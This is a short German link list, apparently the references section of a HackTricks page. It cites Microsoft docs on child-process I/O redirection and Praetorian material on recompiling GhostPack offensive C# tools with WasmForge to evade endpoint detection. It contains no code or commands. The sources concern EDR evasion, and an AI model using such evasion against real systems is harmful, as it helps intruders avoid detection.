- [43] [Microsoft Learn – Einen Child-Prozess mit umgeleiteter Ein- und Ausgabe erstellen](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: C#-Tools mit WasmForge neu schmieden](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – C#-/.NET-Projekte kompilieren](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
{{#include ../banners/hacktricks-training.md}}
